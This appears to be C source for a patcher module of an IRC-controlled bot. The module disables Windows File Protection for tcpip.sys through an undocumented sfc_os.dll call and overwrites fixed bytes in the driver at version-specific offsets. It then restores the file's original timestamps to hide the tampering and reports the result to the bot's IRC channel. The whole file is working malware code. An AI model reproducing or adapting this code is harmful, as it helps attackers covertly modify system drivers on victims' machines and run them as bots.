#include "include.h"

#ifndef NO_PATCHER

extern "C" {
	#include "version.h"
}

BOOL backup(char szPath[MAX_PATH]) {

	char szBckPath[MAX_PATH];

	sprintf(szBckPath, "%s.bck", szPath);
	if (CopyFile(szPath, szBckPath, FALSE)) return TRUE;
	else return FALSE;
}

void Disable_WFP(char *szFile) {
	wchar_t path[256];
	MultiByteToWideChar(CP_ACP, 0, szFile, -1, path, 256);

	typedef DWORD(__stdcall *CPP) (DWORD param1, PWCHAR param2, DWORD param3);
	HINSTANCE hmod=LoadLibrary("sfc_os.dll");
	CPP SetSfcFileException;
	SetSfcFileException= (CPP)GetProcAddress(hmod,(LPCSTR)5);
	SetSfcFileException(0, path, -1);

}

DWORD WINAPI PatcherThread(LPVOID param) { 

	FILE *f;
	int i; 
	HANDLE hTimeFile;
	FILETIME aFileTime, bFileTime, cFileTime;
	char Buffer[MAX_LINE_SIZE];
	char szPath[MAX_PATH], szSysDir[MAX_PATH];
	char *bytes2180[8] = {"\x4C", "\x16", "\x06", "\x00", "\xE8", "\x03", "\x00", "\x00"};
	char *bytes2892[8] = {"\x43", "\xFC", "\x05", "\x00", "\xE8", "\x03", "\x00", "\x00"};
	char *bytes2505[2] = {"\xE5", "\xC8"};
	char *bytes2685[3] = {"\x99", "\x47", "\xC8"};
	int match = 0, offset[8];

	char *szByte;

	BOOL fixed = FALSE;

	PATCHER patcher = *((PATCHER *)param);
	PATCHER *patcherp = (PATCHER *)param;
	patcherp->GotInfo = TRUE;

	Sleep(10000);

	szByte = (char *) malloc (1);

	if (!patcher.Silent) IrcPrivmsg(patcher.Sock, InfoChan, "\2RAGE:\2 attempting to patch \2TCPIP.SYS\2");
	
	GetSystemDirectory(szSysDir, sizeof(szSysDir));
	sprintf(szPath, "%s\\drivers\\tcpip.sys", szSysDir);

	int version = tcpipVersion(szPath);

	if (version == 0) {
		ClearThread(patcher.ThreadNum);
		ExitThread(0);
	}
	backup(szPath);
	Sleep(2000);
	Disable_WFP(szPath);
	SetFileAttributes(szPath, FILE_ATTRIBUTE_NORMAL);
	hTimeFile = CreateFile(szPath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hTimeFile != INVALID_HANDLE_VALUE) {
		GetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
		CloseHandle(hTimeFile);
	}
	f = fopen(szPath, "r+b");
	if (f == NULL) {
		ClearThread(patcher.ThreadNum);
		ExitThread(0);
	}

	switch (version) {
	case 1: 
		{
		offset[0] = 0x00130;
		offset[1] = 0x00131;
		offset[2] = 0x00132;
		offset[3] = 0x00133;
		offset[4] = 0x4F322;
		offset[5] = 0x4F323;
		offset[6] = 0x4F324;
		offset[7] = 0x4F325;
		for (i = 0; i < 8; i++) {         
			fseek(f, offset[i], SEEK_SET);
			fread(szByte, 1, 1, f);
			if (strncmp(szByte, bytes2180[i], 1) == 0) match++;
		}
		if (match < 8) { 
			for (i = 0; i < 8; i++) {
				fseek(f, offset[i], SEEK_SET);
				fwrite(bytes2180[i], 1, 1, f);		
			}
			fixed = TRUE;
		}
		break;
		}
	case 2:
		{
		offset[0] = 0x00130;
		offset[1] = 0x00131;
		offset[2] = 0x00132;
		offset[3] = 0x00133;
		offset[4] = 0x4F5A2;
		offset[5] = 0x4F5A3;
		offset[6] = 0x4F5A4;
		offset[7] = 0x4F5A5;
		//check the file
		for (i = 0; i < 8; i++) {         
			fseek(f, offset[i], SEEK_SET);
			fread(szByte, 1, 1, f);
			if (strncmp(szByte, bytes2892[i], 1) == 0) match++;
		}
		if (match < 8) { 
			//write bytes to file
			for (i = 0; i < 8; i++) {
				fseek(f, offset[i], SEEK_SET);
				fwrite(bytes2892[i], 1, 1, f);
			}
			fixed = TRUE;
		}
		break;
		}
	}
	fclose(f);
	hTimeFile = CreateFile(szPath, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hTimeFile != INVALID_HANDLE_VALUE) {
		SetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
		CloseHandle(hTimeFile);
	}

	if (fixed) 
	{
		_snprintf(Buffer, sizeof(Buffer), "\2TCPIP.SYS PATCHED!\2", version);
		if (!patcher.Silent) IrcPrivmsg(patcher.Sock, InfoChan, Buffer);
		memset(Buffer, 0, sizeof(Buffer));
	}

	ClearThread(patcher.ThreadNum);
	ExitThread(0);
}

#endif
